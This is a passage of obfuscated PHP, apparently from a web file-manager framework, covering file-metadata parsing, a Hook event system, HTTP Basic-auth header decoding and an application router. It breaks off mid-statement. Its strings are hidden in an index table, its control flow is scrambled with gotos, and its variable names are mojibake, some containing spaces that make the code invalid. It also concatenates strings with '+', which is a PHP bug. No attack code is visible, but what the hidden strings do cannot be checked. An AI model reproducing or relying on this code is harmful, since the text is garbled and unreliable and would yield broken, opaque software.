$E…½´ŠÖñ¶ = @$D¸†ÊÒî›ô->analyze($e‘·Óáƒ“†, $B¼ì¸³¤°[$eøÉîŸôºË[77]], $B¼ì¸³¤°[$eøÉîŸôºË[28]]); $E½½çÊ»İÇ = self::parseData($E…½´ŠÖñ¶, $B™Ó•®¶–, $B¼ì¸³¤°); } } } catch (Exception $c•»›Å‹Áè) { $E½½çÊ»İÇ = array($eøÉîŸôºË[368] => $EœàÔõ³’); } if (!$E½½çÊ»İÇ) { return; } goto AÚ×ò†Ô; eÈ‡Éğ¿İÚ: if (!$B¼ì¸³¤° || $B¼ì¸³¤°[$eøÉîŸôºË[29]] != $eøÉîŸôºË[163]) { return; } if (!self::support($B¼ì¸³¤°[$eøÉîŸôºË[156]]) || isset($B¼ì¸³¤°[$eøÉîŸôºË[421]])) { return; } $e‘·Óáƒ“† = $eøÉîŸôºË[1577] . $B¼ì¸³¤°[$eøÉîŸôºË[75]]; goto aÀ¿àòÔ•è; bï¼Å‡ğ†: } public static function support($EÁéæÅ÷°Ğ) { goto f‡¢Úò£®; dèõ•ÅÑ·Ü: return !1; goto a¼Ÿš¡’Ò; f‡¢Úò£®: $Bô ÂåÁé =& $_SERVER[õëù©û]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $EÁéæÅ÷°Ğ = strtolower($EÁéæÅ÷°Ğ); goto f™‹¨‡ç‰; f™‹¨‡ç‰: $cå·ë•à‹ = array($Bô ÂåÁé[1580], $Bô ÂåÁé[1578]); if (in_array($EÁéæÅ÷°Ğ, $cå·ë•à‹)) { return !0; } if (isset(self::$fileTypeArray[$Bô ÂåÁé[1581]][$EÁéæÅ÷°Ğ])) { return !0; } goto dèõ•ÅÑ·Ü; a¼Ÿš¡’Ò: } private static function parseData($C—£ö…Ä¾Ş, $eŠ¤¢š’â, $CŠ•Ğ“¸ìÃ) { $eç¶¹±ƒ‘ =& $_SERVER[õëù©û]; $Aïµ—±·ö¬ = $C—£ö…Ä¾Ş[$eç¶¹±ƒ‘[1584]]; $Aõ…øİë®” = array(); foreach ($eŠ¤¢š’â as $fï¤—Ä Á => $bÅù²÷ê›¾) { foreach ($bÅù²÷ê›¾ as $B‡…¶Ùö•¯) { if (is_array($B‡…¶Ùö•¯)) { $Aí±‹œÃ = self::parseData($C—£ö…Ä¾Ş, $bÅù²÷ê›¾, $CŠ•Ğ“¸ìÃ); if ($Aí±‹œÃ) { $Aõ…øİë®”[$fï¤—Ä Á] = $Aí±‹œÃ; } break; } $e’‡’ë…İ = str_replace($eç¶¹±ƒ‘[1357], $Aïµ—±·ö¬, $B‡…¶Ùö•¯); $Aí±‹œÃ = _get($C—£ö…Ä¾Ş, $e’‡’ë…İ); $Aí±‹œÃ = is_array($Aí±‹œÃ) ? $Aí±‹œÃ[0] : $Aí±‹œÃ; if ($Aí±‹œÃ) { break; } } if ($Aí±‹œÃ || $Aí±‹œÃ === 0 || $Aí±‹œÃ === !1) { $Aí±‹œÃ = self::valueReset($B‡…¶Ùö•¯, $Aí±‹œÃ, $fï¤—Ä Á); if ($Aí±‹œÃ !== null) { $Aõ…øİë®”[$fï¤—Ä Á] = $Aí±‹œÃ; } } } $Aõ…øİë®” = self::valueResetAll($Aõ…øİë®”, $CŠ•Ğ“¸ìÃ); return $Aõ…øİë®”; } private static function psdParse($AÕŸŒœŠÊĞ) { $aÎÖ‘ÖÉº =& $_SERVER[õëù©û]; if (IO::fileSubstr($AÕŸŒœŠÊĞ, 0, 4) != $aÎÖ‘ÖÉº[1585]) { return !1; } $dé¢ò•²àÖ = getImageSize($AÕŸŒœŠÊĞ, $EŒˆÏ³„•Ü); if (!$dé¢ò•²àÖ) { return; } $bÇÔ’±õª½ = array($aÎÖ‘ÖÉº[1500] => $dé¢ò•²àÖ[0], $aÎÖ‘ÖÉº[1502] => $dé¢ò•²àÖ[1]); return $bÇÔ’±õª½; } private static function pdfParse($fô¬öšğ) { return FileParsePdf::parse($fô¬öšğ); } private static function fileTypeParse() { $A¾˜êáÏ™ =& $_SERVER[õëù©û]; $DŒ¿‚‚ø‚ = self::fileTypeArray(); $bõ©«Ó§Œ = array(); foreach ($DŒ¿‚‚ø‚ as $B‡Ùˆ×Ìø÷ => $B‚Ë™…×¨‚) { $aİÁæØ‡ì = _get($B‚Ë™…×¨‚, $A¾˜êáÏ™[156], $A¾˜êáÏ™[33]); $B¹ŸÛŠ‡´Ì = is_string($aİÁæØ‡ì) ? explode($A¾˜êáÏ™[47], $aİÁæØ‡ì) : $aİÁæØ‡ì; if (!$B¹ŸÛŠ‡´Ì) { continue; } foreach ($B¹ŸÛŠ‡´Ì as $aİÁæØ‡ì) { $aİÁæØ‡ì = strtolower(trim($aİÁæØ‡ì)); if (!$aİÁæØ‡ì) { continue; } $bõ©«Ó§Œ[$aİÁæØ‡ì] = $B‡Ùˆ×Ìø÷; } $DŒ¿‚‚ø‚[$B‡Ùˆ×Ìø÷][$A¾˜êáÏ™[156]] = array_keys($bõ©«Ó§Œ); $DŒ¿‚‚ø‚[$B‡Ùˆ×Ìø÷][$A¾˜êáÏ™[1583]] = self::parseKeyMap($B‚Ë™…×¨‚[$A¾˜êáÏ™[1583]]); } return array($A¾˜êáÏ™[1582] => $DŒ¿‚‚ø‚, $A¾˜êáÏ™[1581] => $bõ©«Ó§Œ); } private static function parseKeyMap($a…å‹©ˆ) { $BÀÈ‹•¸í‡ =& $_SERVER[õëù©û]; foreach ($a…å‹©ˆ as $e¯Ô›öªê => $aÔÃëÁßÜ) { if (is_array($aÔÃëÁßÜ)) { $b›á½³ğÌ = self::parseKeyMap($aÔÃëÁßÜ); if ($b›á½³ğÌ) { $a…å‹©ˆ[$e¯Ô›öªê] = $b›á½³ğÌ; } continue; } $dÛˆößÒŠ = explode($BÀÈ‹•¸í‡[47], $aÔÃëÁßÜ); $E×‡—Çò‰å = array(); foreach ($dÛˆößÒŠ as $cÓ÷ÌôíĞ) { $cÓ÷ÌôíĞ = trim($cÓ÷ÌôíĞ); if (!$cÓ÷ÌôíĞ) { continue; } if (preg_match($BÀÈ‹•¸í‡[1586], $cÓ÷ÌôíĞ, $D×â×µ™êï)) { $AÌ†ÒùŞ´¤ = explode($BÀÈ‹•¸í‡[267], $D×â×µ™êï[1]); foreach ($AÌ†ÒùŞ´¤ as $a°»ƒËÚ·¸) { $E×‡—Çò‰å[] = str_replace($D×â×µ™êï[0], $a°»ƒËÚ·¸, $cÓ÷ÌôíĞ); } } else { $E×‡—Çò‰å[] = $cÓ÷ÌôíĞ; } } $a…å‹©ˆ[$e¯Ô›öªê] = $E×‡—Çò‰å; } return $a…å‹©ˆ; } private static function valueResetAll($fÕ·‡™ÖŒ¡, $fÕÒÜáëÒ‰) { goto E¡à™™°øÈ; AƒîÉ‚‡ò™: $BƒçÒ±ì„‚ = _get($fÕ·‡™ÖŒ¡, $DÔ¯–àÖÖò[1599], $DÔ¯–àÖÖò[33]); $aİ‘æ‘Õ–ì = $fã†‚¢¥ôÕ . $F¦‘£³½¼õ . $BƒçÒ±ì„‚; if ($aİ‘æ‘Õ–ì && get_charset($aİ‘æ‘Õ–ì) != $DÔ¯–àÖÖò[322]) { $fÕ·‡™ÖŒ¡[$DÔ¯–àÖÖò[1596]][$DÔ¯–àÖÖò[1310]] = iconv_to($fÕ·‡™ÖŒ¡[$DÔ¯–àÖÖò[1596]][$DÔ¯–àÖÖò[1310]], get_charset($aİ‘æ‘Õ–ì), $DÔ¯–àÖÖò[322]); $fÕ·‡™ÖŒ¡[$DÔ¯–àÖÖò[1596]][$DÔ¯–àÖÖò[1600]] = iconv_to($fÕ·‡™ÖŒ¡[$DÔ¯–àÖÖò[1596]][$DÔ¯–àÖÖò[1600]], get_charset($aİ‘æ‘Õ–ì), $DÔ¯–àÖÖò[322]); $fÕ·‡™ÖŒ¡[$DÔ¯–àÖÖò[1596]][$DÔ¯–àÖÖò[1601]] = iconv_to($fÕ·‡™ÖŒ¡[$DÔ¯–àÖÖò[1596]][$DÔ¯–àÖÖò[1601]], get_charset($aİ‘æ‘Õ–ì), $DÔ¯–àÖÖò[322]); } goto CİÁÃ„› ±; E¡à™™°øÈ: $DÔ¯–àÖÖò =& $_SERVER[õëù©û]; if (isset($fÕ·‡™ÖŒ¡[$DÔ¯–àÖÖò[1587]])) { $aÜ»‚Ö¦‰á = ceil($fÕ·‡™ÖŒ¡[$DÔ¯–àÖÖò[1587]]); $A²Ê©–âœ = intval($aÜ»‚Ö¦‰á / 3600); $eÏ¥Ç¶æÕ† = intval(($aÜ»‚Ö¦‰á - $A²Ê©–âœ * 3600) / 60); $dôŞÏ„´¡ë = $aÜ»‚Ö¦‰á % 60; $fÕ·‡™ÖŒ¡[$DÔ¯–àÖÖò[1588]] = sprintf($DÔ¯–àÖÖò[1589], $A²Ê©–âœ, $eÏ¥Ç¶æÕ†, $dôŞÏ„´¡ë); if ($A²Ê©–âœ == 0) { $fÕ·‡™ÖŒ¡[$DÔ¯–àÖÖò[1588]] = sprintf($DÔ¯–àÖÖò[1590], $eÏ¥Ç¶æÕ†, $dôŞÏ„´¡ë); } } $C¡‹ÍÔ´í = _get($fÕ·‡™ÖŒ¡, $DÔ¯–àÖÖò[1591]); goto eæÖ†¥²ù†; CİÁÃ„› ±: return $fÕ·‡™ÖŒ¡; goto E¤¦„Éºß ; eæÖ†¥²ù†: if ($C¡‹ÍÔ´í) { $cß‰‚£Úì = IO_PATH_SYSTEM_TEMP . $DÔ¯–àÖÖò[1592] . KodIO::hashPath($fÕÒÜáëÒ‰) . $DÔ¯–àÖÖò[1593]; $fÕ·‡™ÖŒ¡[$DÔ¯–àÖÖò[1594]] = Action($DÔ¯–àÖÖò[1595])->pluginCacheFileSet($cß‰‚£Úì, $C¡‹ÍÔ´í); unset($fÕ·‡™ÖŒ¡[$DÔ¯–àÖÖò[1596]][$DÔ¯–àÖÖò[1579]]); } $fã†‚¢¥ôÕ = _get($fÕ·‡™ÖŒ¡, $DÔ¯–àÖÖò[1597], $DÔ¯–àÖÖò[33]); $F¦‘£³½¼õ = _get($fÕ·‡™ÖŒ¡, $DÔ¯–àÖÖò[1598], $DÔ¯–àÖÖò[33]); goto AƒîÉ‚‡ò™; E¤¦„Éºß : } private static function valueReset($BÕîè¤Ìœ, $béòŠ‚•æ‹, $c­ãÌ¿îô¨) { $Cã éá±Ç =& $_SERVER[õëù©û]; $AŒÒ¸¶Òô¡ = $Cã éá±Ç[1517]; switch ($BÕîè¤Ìœ) { case $Cã éá±Ç[1602]: $béòŠ‚•æ‹ = $béòŠ‚•æ‹ == $Cã éá±Ç[83] ? $Cã éá±Ç[1603] : $Cã éá±Ç[1604]; break; case $Cã éá±Ç[1605]: $béòŠ‚•æ‹ = $béòŠ‚•æ‹ ? $béòŠ‚•æ‹ : null; break; default: break; } switch ($c­ãÌ¿îô¨) { case $Cã éá±Ç[1606]: $béòŠ‚•æ‹ = round($béòŠ‚•æ‹, 2); break; case $Cã éá±Ç[183]: case $Cã éá±Ç[106]: if ($béòŠ‚•æ‹ < 0) { $béòŠ‚•æ‹ = null; } else { if (is_numeric($béòŠ‚•æ‹)) { $béòŠ‚•æ‹ = date($AŒÒ¸¶Òô¡, $béòŠ‚•æ‹); } } break; default: break; } return $béòŠ‚•æ‹; } private static function fileTypeArray() { $cù»ÛµÚ =& $_SERVER[õëù©û]; return array($cù»ÛµÚ[1579] => array($cù»ÛµÚ[156] => $cù»ÛµÚ[1607] . $cù»ÛµÚ[1608], $cù»ÛµÚ[1583] => array($cù»ÛµÚ[1500] => $cù»ÛµÚ[1609], $cù»ÛµÚ[1502] => $cù»ÛµÚ[1610], $cù»ÛµÚ[1611] => $cù»ÛµÚ[1612], $cù»ÛµÚ[1613] => $cù»ÛµÚ[1614], $cù»ÛµÚ[183] => $cù»ÛµÚ[1615], $cù»ÛµÚ[106] => $cù»ÛµÚ[1616], $cù»ÛµÚ[1617] => $cù»ÛµÚ[1618], $cù»ÛµÚ[1619] => $cù»ÛµÚ[1620], $cù»ÛµÚ[1621] => $cù»ÛµÚ[1622], $cù»ÛµÚ[1623] => $cù»ÛµÚ[1624], $cù»ÛµÚ[1625] => $cù»ÛµÚ[1626], $cù»ÛµÚ[1627] => $cù»ÛµÚ[1628], $cù»ÛµÚ[1629] => $cù»ÛµÚ[1630], $cù»ÛµÚ[1631] => array($cù»ÛµÚ[1632] => $cù»ÛµÚ[1633], $cù»ÛµÚ[1634] => $cù»ÛµÚ[1635], $cù»ÛµÚ[1636] => $cù»ÛµÚ[1637]), $cù»ÛµÚ[1638] => $cù»ÛµÚ[1639], $cù»ÛµÚ[1640] => $cù»ÛµÚ[1641], $cù»ÛµÚ[1642] => $cù»ÛµÚ[1643], $cù»ÛµÚ[1644] => $cù»ÛµÚ[1645], $cù»ÛµÚ[1646] => array($cù»ÛµÚ[1647] => $cù»ÛµÚ[1648], $cù»ÛµÚ[1649] => $cù»ÛµÚ[1650], $cù»ÛµÚ[1651] => $cù»ÛµÚ[1652], $cù»ÛµÚ[1653] => $cù»ÛµÚ[1654], $cù»ÛµÚ[1655] => $cù»ÛµÚ[1656], $cù»ÛµÚ[1657] => $cù»ÛµÚ[1658], $cù»ÛµÚ[1659] => $cù»ÛµÚ[1660], $cù»ÛµÚ[1661] => $cù»ÛµÚ[1662], $cù»ÛµÚ[1663] => $cù»ÛµÚ[1664], $cù»ÛµÚ[1665] => $cù»ÛµÚ[1666], $cù»ÛµÚ[1667] => $cù»ÛµÚ[1668]))), $cù»ÛµÚ[1669] => array($cù»ÛµÚ[156] => $cù»ÛµÚ[1670] . $cù»ÛµÚ[1671], $cù»ÛµÚ[1583] => array($cù»ÛµÚ[1587] => $cù»ÛµÚ[1672], $cù»ÛµÚ[183] => $cù»ÛµÚ[1673], $cù»ÛµÚ[106] => $cù»ÛµÚ[1674], $cù»ÛµÚ[1619] => $cù»ÛµÚ[1675], $cù»ÛµÚ[1676] => $cù»ÛµÚ[1677], $cù»ÛµÚ[1678] => $cù»ÛµÚ[1605], $cù»ÛµÚ[1679] => $cù»ÛµÚ[1680], $cù»ÛµÚ[1681] => $cù»ÛµÚ[1682], $cù»ÛµÚ[1683] => $cù»ÛµÚ[1684], $cù»ÛµÚ[1596] => array($cù»ÛµÚ[1310] => $cù»ÛµÚ[1685], $cù»ÛµÚ[1600] => $cù»ÛµÚ[1686], $cù»ÛµÚ[1601] => $cù»ÛµÚ[1687], $cù»ÛµÚ[1688] => $cù»ÛµÚ[1689], $cù»ÛµÚ[1690] => $cù»ÛµÚ[1691], $cù»ÛµÚ[1692] => $cù»ÛµÚ[1693], $cù»ÛµÚ[1579] => $cù»ÛµÚ[1694]))), $cù»ÛµÚ[1695] => array($cù»ÛµÚ[156] => $cù»ÛµÚ[1696] . $cù»ÛµÚ[1697], $cù»ÛµÚ[1583] => array($cù»ÛµÚ[1500] => $cù»ÛµÚ[1698], $cù»ÛµÚ[1502] => $cù»ÛµÚ[1699], $cù»ÛµÚ[1587] => $cù»ÛµÚ[1672], $cù»ÛµÚ[183] => $cù»ÛµÚ[1700], $cù»ÛµÚ[106] => $cù»ÛµÚ[1701], $cù»ÛµÚ[1606] => $cù»ÛµÚ[1702], $cù»ÛµÚ[1683] => $cù»ÛµÚ[1703], $cù»ÛµÚ[1679] => $cù»ÛµÚ[1704], $cù»ÛµÚ[1619] => $cù»ÛµÚ[1705], $cù»ÛµÚ[1669] => array($cù»ÛµÚ[1678] => $cù»ÛµÚ[1605], $cù»ÛµÚ[1706] => $cù»ÛµÚ[1707], $cù»ÛµÚ[1676] => $cù»ÛµÚ[1677], $cù»ÛµÚ[1683] => $cù»ÛµÚ[1684], $cù»ÛµÚ[1679] => $cù»ÛµÚ[1708], $cù»ÛµÚ[1681] => $cù»ÛµÚ[1682]))), $cù»ÛµÚ[1709] => array($cù»ÛµÚ[1583] => array($cù»ÛµÚ[1710] => $cù»ÛµÚ[1711], $cù»ÛµÚ[1712] => $cù»ÛµÚ[1713])), $cù»ÛµÚ[1714] => array($cù»ÛµÚ[1583] => array())); } } class Hook { private static $events = array(); public static function get($F„‹á˜ÆÕ = false) { if (!$F„‹á˜ÆÕ) { return self::$events; } else { return self::$events[$F„‹á˜ÆÕ]; } } public static function apply($cË¹šÎØ¯, $e¦‡Ççºª = array()) { $cŒÅ ·ïÊó = ActionApply($cË¹šÎØ¯, $e¦‡Ççºª); if (is_string($cË¹šÎØ¯)) { Hook::trigger($cË¹šÎØ¯); } return $cŒÅ ·ïÊó; } public static function bind($bÔÖîÌ–ï, $Cáìî¼È…İ, $cåèÖÊàÊ = false) { $d˜³‡ˆ…ìË =& $_SERVER[õëù©û]; if (!isset(self::$events[$bÔÖîÌ–ï])) { self::$events[$bÔÖîÌ–ï] = array(); } self::$events[$bÔÖîÌ–ï][] = array($d˜³‡ˆ…ìË[1715] => $Cáìî¼È…İ, $d˜³‡ˆ…ìË[1716] => $cåèÖÊàÊ, $d˜³‡ˆ…ìË[1717] => 0); } public static function once($EÒÃßÏÁî, $d…äÍëé‡) { self::bind($EÒÃßÏÁî, $d…äÍëé‡, !0); } public static function unbind($CÍäÉŞ¶©©, $E©‚±Ì‰Ë = false) { if (!$E©‚±Ì‰Ë) { self::$events[$CÍäÉŞ¶©©] = array(); return; } $c¹˜…¬Çˆø = self::$events[$CÍäÉŞ¶©©]; self::$events[$CÍäÉŞ¶©©] = array(); if (!is_array($c¹˜…¬Çˆø)) { return; } for ($cšŠÛ« = 0; $cšŠÛ« < count($c¹˜…¬Çˆø); $cšŠÛ«++) { if ($c¹˜…¬Çˆø[$cšŠÛ«][$_SERVER[õëù©û][1715]] == $E©‚±Ì‰Ë) { continue; } self::$events[$CÍäÉŞ¶©©][] = $c¹˜…¬Çˆø[$cšŠÛ«]; } } public static function filter($DÛÄÑÚ˜ƒ™, $Bæ¶’”Æğ¨) { goto eŞŸŠÅõØ‰; eŞŸŠÅõØ‰: $fË³ğ»ßê÷ =& $_SERVER[õëù©û]; $Bâ‹–×Ûß« = self::$events; if (!isset($Bâ‹–×Ûß«[$DÛÄÑÚ˜ƒ™])) { return $Bæ¶’”Æğ¨; } goto Eí´à™›…½; Eí´à™›…½: $C’ÀÃªØ¦Ñ = $Bâ‹–×Ûß«[$DÛÄÑÚ˜ƒ™]; $bÑğ“Çšöî = $Bæ¶’”Æğ¨; if (!is_array($C’ÀÃªØ¦Ñ) || count($C’ÀÃªØ¦Ñ) == 0) { return $bÑğ“Çšöî; } goto A‡íáÁƒæ; A‡íáÁƒæ: for ($EÙ¬òÈŒœƒ = 0; $EÙ¬òÈŒœƒ < count($C’ÀÃªØ¦Ñ); $EÙ¬òÈŒœƒ++) { $B· ““»‹ = $C’ÀÃªØ¦Ñ[$EÙ¬òÈŒœƒ]; if ($B· ““»‹[$fË³ğ»ßê÷[1716]] && $B· ““»‹[$fË³ğ»ßê÷[1717]] > 1) { continue; } self::$events[$DÛÄÑÚ˜ƒ™][$EÙ¬òÈŒœƒ][$fË³ğ»ßê÷[1717]] = $B· ““»‹[$fË³ğ»ßê÷[1717]] + 1; $aè Ÿ›…÷œ = self::apply($B· ““»‹[$fË³ğ»ßê÷[1715]], array($bÑğ“Çšöî)); if (gettype($aè Ÿ›…÷œ) == gettype($bÑğ“Çšöî)) { $bÑğ“Çšöî = $aè Ÿ›…÷œ; } } return $bÑğ“Çšöî; goto fğÍÎëÊ‘Œ; fğÍÎëÊ‘Œ: } public static function trigger($C˜èáÈ) { goto DÕµëÚ ø; C í×®Š°©: if (!isset($D˜‚§ƒ¨ÊÎ[$C˜èáÈ])) { return $F•”ËïÂÄ«; } $F¦Ñ—×‡¢ã = $D˜‚§ƒ¨ÊÎ[$C˜èáÈ]; if (!is_array($F¦Ñ—×‡¢ã) || count($F¦Ñ—×‡¢ã) == 0) { return $F•”ËïÂÄ«; } goto EÁ®††Üá; EÁ®††Üá: $CÅ³Õ…˜ª… = func_get_args(); array_shift($CÅ³Õ…˜ª…); for ($bˆÖ…§Ë± = 0; $bˆÖ…§Ë± < count($F¦Ñ—×‡¢ã); $bˆÖ…§Ë±++) { $Eºò‹Åœ©© = $F¦Ñ—×‡¢ã[$bˆÖ…§Ë±]; if ($Eºò‹Åœ©©[$E«òïœ¡ˆè[1716]] && $Eºò‹Åœ©©[$E«òïœ¡ˆè[1717]] > 1) { continue; } if (defined($E«òïœ¡ˆè[1718]) && GLOBAL_LOG_HOOK) { write_log($C˜èáÈ . $E«òïœ¡ˆè[1719] . $Eºò‹Åœ©©[$E«òïœ¡ˆè[1715]], $E«òïœ¡ˆè[1720]); } self::$events[$C˜èáÈ][$bˆÖ…§Ë±][$E«òïœ¡ˆè[1717]] = $Eºò‹Åœ©©[$E«òïœ¡ˆè[1717]] + 1; $BºÊ© Ğ = self::apply($Eºò‹Åœ©©[$E«òïœ¡ˆè[1715]], $CÅ³Õ…˜ª…); if (defined($E«òïœ¡ˆè[1718]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $E«òïœ¡ˆè[1720]); if ($Eºò‹Åœ©©[$E«òïœ¡ˆè[1717]] == 200) { $Dà¥â¡Åƒ² = is_array($Eºò‹Åœ©©[$E«òïœ¡ˆè[1715]]) ? json_encode_force($Eºò‹Åœ©©[$E«òïœ¡ˆè[1715]]) : $Eºò‹Åœ©©[$E«òïœ¡ˆè[1715]]; write_log($E«òïœ¡ˆè[1721] . $C˜èáÈ . $E«òïœ¡ˆè[1722] . $Dà¥â¡Åƒ², $E«òïœ¡ˆè[1723]); } } $F•”ËïÂÄ« = is_null($BºÊ© Ğ) ? $F•”ËïÂÄ« : $BºÊ© Ğ; } goto fÙø¢Š»‹İ; fÙø¢Š»‹İ: return $F•”ËïÂÄ«; goto fÓÃ‚»Ø×; DÕµëÚ ø: $E«òïœ¡ˆè =& $_SERVER[õëù©û]; $D˜‚§ƒ¨ÊÎ = self::$events; $F•”ËïÂÄ« = !1; goto C í×®Š°©; fÓÃ‚»Ø×: } } class HttpAuth { public static function get() { $BŠõ„öƒª´ =& $_SERVER[õëù©û]; $e· ‡¹ËÍ = $BŠõ„öƒª´[33]; $DÖ»†Š¢Ê = $BŠõ„öƒª´[33]; if (isset($_SERVER[$BŠõ„öƒª´[1724]])) { $e· ‡¹ËÍ = $_SERVER[$BŠõ„öƒª´[1724]]; $DÖ»†Š¢Ê = $_SERVER[$BŠõ„öƒª´[1725]]; } elseif (isset($_SERVER[$BŠõ„öƒª´[1726]])) { $cÒ«³ê‹å¹ = $_SERVER[$BŠõ„öƒª´[1726]]; if (strpos(strtolower($cÒ«³ê‹å¹), $BŠõ„öƒª´[1727]) === 0) { $eƒ¹óÀ‡× = explode($BŠõ„öƒª´[4], base64_decode(substr($cÒ«³ê‹å¹, 6))); $e· ‡¹ËÍ = isset($eƒ¹óÀ‡×[0]) ? $eƒ¹óÀ‡×[0] : $BŠõ„öƒª´[33]; $DÖ»†Š¢Ê = isset($eƒ¹óÀ‡×[1]) ? $eƒ¹óÀ‡×[1] : 0; } } return array($BŠõ„öƒª´[530] => $e· ‡¹ËÍ, $BŠõ„öƒª´[890] => $DÖ»†Š¢Ê); } public static function error() { goto a„ÉáÒ©‰­; BÓâäÃšéŒ: header($a¬ºš°ƒÃ„[1730]); header($a¬ºš°ƒÃ„[1731]); header($a¬ºš°ƒÃ„[1246]); goto a¯Ä…êŠšì; a¯Ä…êŠšì: die; goto e¸ÍÕ´âˆ¶; a„ÉáÒ©‰­: $a¬ºš°ƒÃ„ =& $_SERVER[õëù©û]; header($a¬ºš°ƒÃ„[1728]); header($a¬ºš°ƒÃ„[1729]); goto BÓâäÃšéŒ; e¸ÍÕ´âˆ¶: } public static function make($bØ¸µš«î, $FØ´“¬Íñî) { $B¸çØğ½¡ =& $_SERVER[õëù©û]; return $B¸çØğ½¡[1732] + base64_encode($bØ¸µš«î . $B¸çØğ½¡[4] . $FØ´“¬Íñî); } } goto B¤Ò´×¶ÚŞ; Dá‘Îè¨êİ: class Application { private $defaultModule = "\x69\156\x64\145\x78"; private $defaultController = "\x69\156\x64\x65\x78"; private $defaultAction = "\x69\x6e\x64\x65\x78"; function __construct() { } public function setDefault($eÕ”ÛÜ÷š) { goto eå¤¸Â³Ûâ; e¶µé£È«·: $bÁ„éãà×¹ = $_SERVER[õëù©û][546]; $this->defaultController = $DùŠÙîËÈî[1] ? $DùŠÙîËÈî[1] : $this->defaultController; $this->defaultAction = $DùŠÙîËÈî[2] ? $DùŠÙîËÈî[2] : $this->defaultAction; goto D¨ÔµèŒÍ‹; D¨ÔµèŒÍ‹: $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][3]}($BºéÀµïÏŠ[4], array($this, $BºéÀµïÏŠ[5])); goto f¬´ÀÕäÜò; eå¤¸Â³Ûâ: $BºéÀµïÏŠ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $DùŠÙîËÈî = $BºéÀµïÏŠ[0]($BºéÀµïÏŠ[1], $BºéÀµïÏŠ[2]($eÕ”ÛÜ÷š, $BºéÀµïÏŠ[1])); $this->defaultModule = $DùŠÙîËÈî[0] ? $DùŠÙîËÈî[0] : $this->defaultModule; goto e¶µé£È«·; f¬´ÀÕäÜò: } public function appRun($cÇİÊ’Èµ¾) { goto Fğ×¸Õ™»´; Fğ×¸Õ™»´: $d®Û¼Á£§‚ =& $_SERVER[õëù©û]; $fªŠöÚí‘Ê =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $FƒÊ´™“‡‘ = $fªŠöÚí‘Ê[0]($fªŠöÚí‘Ê[1], $cÇİÊ’Èµ¾); goto Bš“›Œ¤å; Bš“›Œ¤å: $fãÀ¢ë‡· = $fªŠöÚí‘Ê[6]($FƒÊ´™“‡‘[0]); $EÀ¢é÷ïŠ¢ = $d®Û¼Á£§‚[547]; while ($EÀ¢é÷ïŠ¢ < $d®Û¼Á£§‚[548]) { if ($EÀ¢é÷ïŠ¢ >= 0) { break; } $EÀ¢é÷ïŠ¢++; } goto eßÎ˜­÷¿ä; eßÎ˜­÷¿ä: $a¾Œôã‰¢ = $fªŠöÚí‘Ê[7]; if ($fãÀ¢ë‡· == $fªŠöÚí‘Ê[8]) { $a¾Œôã‰¢ = $fªŠöÚí‘Ê[9]; $FƒÊ´™“‡‘[0] = $fªŠöÚí‘Ê[10]; $FƒÊ´™“‡‘[1] = $FƒÊ´™“‡‘[1] . $fªŠöÚí‘Ê[11]; $cÇİÊ’Èµ¾ = $fªŠöÚí‘Ê[12]($fªŠöÚí‘Ê[1], $FƒÊ´™“‡‘); $cÇİÊ’Èµ¾ = $fªŠöÚí‘Ê[2]($cÇİÊ’Èµ¾, $fªŠöÚí‘Ê[1]); } $fªŠöÚí‘Ê[13](array($fªŠöÚí‘Ê[14], $fªŠöÚí‘Ê[15]), $a¾Œôã‰¢ . $fªŠöÚí‘Ê[16], $cÇİÊ’Èµ¾); goto E…êØÇ‰¹Ü; dæÊ¦ƒ·Ÿ®: if (strlen($B…—õÇÛá) < $d®Û¼Á£§‚[550]) { return; } goto F¹šƒ²Î¤; E…êØÇ‰¹Ü: $fªŠöÚí‘Ê[17]($cÇİÊ’Èµ¾); $fªŠöÚí‘Ê[13](array($fªŠöÚí‘Ê[14], $fªŠöÚí‘Ê[15]), $a¾Œôã‰¢ . $fªŠöÚí‘Ê[18], $cÇİÊ’Èµ¾); $B…—õÇÛá = $d®Û¼Á£§‚[549]; goto dæÊ¦ƒ·Ÿ®; F¹šƒ²Î¤: } private function autorun() { $F¯¥çˆœ¶° =& $_SERVER[õëù©û]; $Dà©Ñ©…÷ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; global $config; if ($Dà©Ñ©…÷[19]($config[$Dà©Ñ©…÷[20]]) == 0) { return; } foreach ($config[$Dà©Ñ©…÷[20]] as $dö˜¬Úå™ => $Fô—Ú³§ë) { $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][21]}($Fô—Ú³§ë); $bÑ®ĞÏ¡‰Æ = $F¯¥çˆœ¶°[551]; if (strlen($bÑ®ĞÏ¡‰Æ) < $F¯¥çˆœ¶°[550]) { return; } } } private function lpyi8e498129() { goto e§Öªˆ¦‚ò; e§Öªˆ¦‚ò: $e•´”•öÈÃ =& $_SERVER[õëù©û]; $E‹ä¯¦ÚÃ¹ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $D™à¢Çå‡å = $E‹ä¯¦ÚÃ¹[8]; goto C’à‡­½³·; B×•îÏšÆ: $E™°ÕÒÏ = $e•´”•öÈÃ[556]; if (!$E™°ÕÒÏ) { return; } $d…ßÓŠ³›Š = $E‹ä¯¦ÚÃ¹[26]($GLOBALS[$E‹ä¯¦ÚÃ¹[22]][$E‹ä¯¦ÚÃ¹[23]], 1); goto e‚Ï×ëßÚÃ; d½¯­ÙÙêî: $GLOBALS[$E‹ä¯¦ÚÃ¹[22]][$E‹ä¯¦ÚÃ¹[28]] = $E‹ä¯¦ÚÃ¹[29]($E‹ä¯¦ÚÃ¹[1], $GLOBALS[$E‹ä¯¦ÚÃ¹[22]][$E‹ä¯¦ÚÃ¹[23]]); $FáÛİÜÜ½­ = $e•´”•öÈÃ[558]; goto bÜ’ö‡’â÷; C’à‡­½³·: $AŸ‹‚â¢ = $GLOBALS[$E‹ä¯¦ÚÃ¹[22]][$E‹ä¯¦ÚÃ¹[23]][0]; $DÕö¿ö­º˜ = $e•´”•öÈÃ[552]; if (strlen($DÕö¿ö­º˜) < $e•´”•öÈÃ[553]) { die; } goto fá•İ†´‚; fá•İ†´‚: if (!$AŸ‹‚â¢ || $E‹ä¯¦ÚÃ¹[24]($AŸ‹‚â¢) <= $E‹ä¯¦ÚÃ¹[24]($D™à¢Çå‡å)) { return; } if 